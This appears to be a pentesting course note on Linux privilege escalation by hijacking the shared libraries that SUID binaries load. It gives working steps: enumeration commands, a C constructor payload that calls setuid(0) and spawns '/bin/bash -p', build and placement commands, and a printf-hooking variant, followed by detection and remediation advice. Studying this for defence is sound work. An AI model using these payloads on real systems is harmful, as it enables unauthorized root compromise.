---
tags: [linux, privesc, pentesting, red-team]
difficulty: advanced
module: "44 - Linux Privilege Escalation"
topic: "44.13 Shared Library Injection"
---

# Shared Library Injection & Hijacking

## Executive Summary

Shared Library Injection (or Hijacking) is an advanced privilege escalation technique that exploits the way Linux applications dynamically load external code libraries (`.so` files) at runtime. When an executable is dynamically linked, it relies on the operating system's dynamic linker (`ld.so`) to locate and map necessary libraries into memory. If an attacker can manipulate this loading process—either by placing a malicious library in a directory that is searched before the legitimate one, or by replacing a library that the application attempts to load but fails to find—they can achieve arbitrary code execution. When the vulnerable application is a Set-User-ID (SUID) binary owned by `root`, this code execution occurs with elevated privileges, resulting in full system compromise.

## Understanding Shared Libraries and ld.so

Most Linux binaries are dynamically linked. Instead of containing all the code they need (static linking), they rely on shared libraries provided by the system.

When a program starts, the dynamic linker (`ld.so` or `ld-linux.so`) executes first. Its job is to find the required libraries and load them. The search order is generally:
1.  Directories specified by the `RPATH` (Run Path) compiled into the binary.
2.  Directories specified in the `LD_LIBRARY_PATH` environment variable (ignored for SUID binaries).
3.  Directories specified by the `RUNPATH` compiled into the binary.
4.  Directories specified in `/etc/ld.so.conf` (cached in `/etc/ld.so.cache`).
5.  Standard system directories (`/lib`, `/usr/lib`, `/lib64`, etc.).

## The Vulnerabilities

There are two primary attack vectors for Shared Library Hijacking:

### 1. Missing Shared Objects
If an SUID binary is compiled to require a specific library, but that library is missing from the system, `ld.so` will systematically search all defined paths trying to find it. If one of those paths is writable by an unprivileged user, the attacker can create a malicious `.so` file with the missing name. The next time the SUID binary runs, it will find and load the attacker's library.

### 2. Insecure RPATH/RUNPATH
Developers can hardcode a search path into the binary using the `RPATH` or `RUNPATH` header. If this hardcoded path points to a directory that is writable by standard users (e.g., `/tmp/libs` or `/home/user/lib`), an attacker can drop a malicious library into that directory. Because `RPATH` is checked *before* standard system directories, the linker will load the attacker's library instead of the legitimate system library.

## Attack Flow Architecture

```ascii
+-----------------------------------+
|  Execution of SUID Binary         |
|  /usr/local/bin/custom_suid_app   |
+-----------------------------------+
                 |
                 | ld.so begins library resolution
                 v
+-----------------------------------+        +-----------------------------------+
|  Checking for libmissing.so       |        |  Attacker monitors with strace    |
|  1. /usr/lib/libmissing.so (No)   | -----> |  Notices search in /tmp/          |
|  2. /tmp/libmissing.so (No)       |        |                                   |
+-----------------------------------+        +-----------------------------------+
                 |
                 v
+-----------------------------------+        +-----------------------------------+
|  Attacker crafts malicious .so    |        |  Attacker executes SUID app again |
|  Places at /tmp/libmissing.so     | <----- |  /usr/local/bin/custom_suid_app   |
+-----------------------------------+        +-----------------------------------+
                                                             |
                                                             | ld.so resolves /tmp/libmissing.so!
                                                             v
                                             +-----------------------------------+
                                             |  ld.so executes initialization    |
                                             |  routines in malicious .so        |
                                             |  Executes /bin/bash               |
                                             +-----------------------------------+
                                                             |
                                                             v
                                             +-----------------------------------+
                                             |  Root Shell Granted               |
                                             |  # id -> uid=0(root)              |
                                             +-----------------------------------+
```

## Exploitation Phase

### Scenario 1: Exploiting Missing Shared Objects

1.  **Find SUID Binaries:**
    ```bash
    find / -type f -perm -04000 -ls 2>/dev/null
    ```

2.  **Analyze Library Dependencies:**
    Use `strace` on suspect SUID binaries (especially custom or third-party ones) to monitor file opening operations (`open`, `openat`, `stat`). We are looking for "No such file or directory" errors (`ENOENT`).
    ```bash
    strace -v -f -e open,openat,stat /usr/local/bin/vulnerable_suid 2>&1 | grep -i "no such file"
    ```
    Output example:
    ```text
    openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
    openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libcalc.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
    openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/libcalc.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
    openat(AT_FDCWD, "/home/user/.config/lib/libcalc.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
    ```

    In this example, the binary is looking for `libcalc.so`. Critically, it searches `/home/user/.config/lib/`, which is writable by our user.

3.  **Create the Payload:**
    Write a C payload that executes a root shell upon initialization.
    ```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>

    __attribute__((constructor)) void inject() {
        setuid(0);
        setgid(0);
        system("/bin/bash -p");
    }
    ```

4.  **Compile and Deploy:**
    Compile it as a shared library and place it in the writable path the linker is checking.
    ```bash
    mkdir -p /home/user/.config/lib/
    gcc -shared -fPIC -o /home/user/.config/lib/libcalc.so payload.c
    ```

5.  **Execute:**
    Run the binary again. The linker will find your library, execute the constructor, and grant a root shell.
    ```bash
    /usr/local/bin/vulnerable_suid
    # id
    uid=0(root) gid=0(root)
    ```

### Scenario 2: Exploiting Writable RPATH

1.  **Inspect Binaries for RPATH:**
    You can use `objdump` or `readelf` to check the `RUNPATH` or `RPATH` of an SUID binary.
    ```bash
    objdump -p /usr/local/bin/custom_suid | grep -i path
    # Output:
    # RPATH                /tmp/devtools/libs
    ```

2.  **Verify Writable Path:**
    Check if you can write to `/tmp/devtools/libs`.
    ```bash
    ls -lah -d /tmp/devtools/libs
    # drwxrwxrwx 2 root root 4.0K Jun  9 12:00 /tmp/devtools/libs
    ```

3.  **Identify Target Library:**
    Use `ldd` to see what libraries the binary requires.
    ```bash
    ldd /usr/local/bin/custom_suid
    # libutils.so => /usr/lib/libutils.so (0x00...)
    ```

4.  **Hijack the Library:**
    Create the same C payload as above. Compile it and place it in the `RPATH` directory, naming it `libutils.so`.
    ```bash
    gcc -shared -fPIC -o /tmp/devtools/libs/libutils.so payload.c
    ```

5.  **Execute:**
    When the binary runs, `ld.so` checks `RPATH` first, finds your `libutils.so`, and executes it instead of the system one.

## Edge Cases & Troubleshooting

### SUID restrictions on strace
You cannot `strace` an SUID binary as a normal user because the kernel prevents it to avoid leaking elevated data. `strace` will run the binary, but the privileges will be dropped. To see the true library loading paths, you must either find a way to read the binary statically (`objdump`), or if you are looking for missing libraries, the dropped-privilege `strace` will still show the failed `open()` calls for libraries.

### Exact Function Hooking
If the binary fails or crashes before giving you a shell because your malicious library is missing actual functions the binary needs, you might need to hook the specific function rather than using a constructor.
```c
// If the binary calls printf("Starting...");
#include <stdlib.h>
#include <unistd.h>
void printf(const char *format, ...) {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

## Detection and Forensics

1.  **Static Analysis of Binaries:** Routinely scan all SUID binaries on the system. Check `RPATH`/`RUNPATH` headers for relative paths or paths pointing to world-writable directories.
2.  **File System Monitoring:** Monitor creation of `.so` files in non-standard directories (like `/tmp`, `/dev/shm`, or user home directories), especially immediately preceding the execution of an SUID binary.
3.  **ldconfig Auditing:** Ensure `/etc/ld.so.conf` does not include any insecure directories.

## Remediation

1.  **Remove Insecure RPATH:** Recompile binaries without hardcoded `RPATH` or `RUNPATH` entries that point to insecure locations. Use `chrpath` or `patchelf` to remove them from existing binaries if recompilation is impossible.
    ```bash
    chrpath -d /usr/local/bin/custom_suid
    ```
2.  **Clean up Missing Libraries:** If an SUID binary requires a library that is missing, either install the library, or if it's dead code, recompile the binary to remove the dependency.
3.  **Strict Permissions:** Ensure all directories listed in `/etc/ld.so.conf` and all system library directories (`/lib`, `/usr/lib`) are strictly owned by root and are not world-writable.

## Chaining Opportunities

*   **[[18 - SUID Executables]]**: This attack is a specific, complex exploitation of SUID binary behavior.
*   **[[12 - LD_PRELOAD Abuse]]**: Similar conceptual vector (manipulating dynamic linking), but relies on `sudo` rather than `RPATH` or missing files.

## Related Notes
*   [[01 - Linux Privilege Escalation Fundamentals]]
*   [[18 - SUID Executables]]
*   [[24 - Binary Exploitation Basics]]
